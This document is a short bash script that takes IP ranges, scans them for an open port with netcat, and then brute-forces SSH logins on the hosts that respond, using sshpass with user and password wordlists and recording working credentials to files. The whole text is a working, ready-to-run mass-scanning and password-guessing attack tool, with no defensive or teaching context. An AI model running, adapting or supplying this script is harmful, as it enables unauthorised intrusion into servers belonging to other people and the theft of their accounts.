#!/bin/bash
read -e -p "Put range ip part 1/4, e.g.:192 255 -> " r1
read -e -p "Put range ip part 2/4, e.g: 168 255 -> " r2
read -e -p "Put range ip part 3/4, e.g.: 1 255 -> " r3
read -e -p "Put range ip part 4/4, e.g.: 10 255 -> " r4
read -e -p "Port to scan: " port
read -e -p "Numbers of Threads (Scan): " threads
read -e -p "Number of Simultaneous Connections (Brute Force): " threads_bf
read -e -p "Users List: " user
read -e -p "Passwords List: " pass
echo '' > targets #>> target
for x in $(seq $r1);do for y in $(seq $r2);do for z in $(seq $r3);do for w in $(seq $r4);do # >> target
echo $port $x.$y.$z.$w >> targets
done done done done
echo '' > logfile;
xargs -a targets -n 2 -P $threads sh -c 'nc $1 '$port' -v -z -w5; echo $? $1 >> logfile'
grep -w "0" logfile > iplist.lst 
echo "IPs Found saved: iplist.lst"
echo "Starting Brute Forcing..."
count=0
for i in $(cat $pass); do
for u in $(cat $user); do
xargs -a iplist.lst -n 2 -P $threads_bf sh -c 'echo trying '$u' '$i' $1; sshpass -p '$i' ssh -o StrictHostKeyChecking=no '$u'@$1 -p 22 uname -a  >> check-$1-'$u'-'$i''
if [[ $(cat check-* ) != "" ]]; then 
find check-* -type f -empty | xargs rm -rf $1
for file in check-*; do mv "$file" "found.$file"; done
let count++;
echo  found $count; 
fi;
done done
find check-* -type f -empty | xargs rm -rf
echo  "found logins: ls found*" 

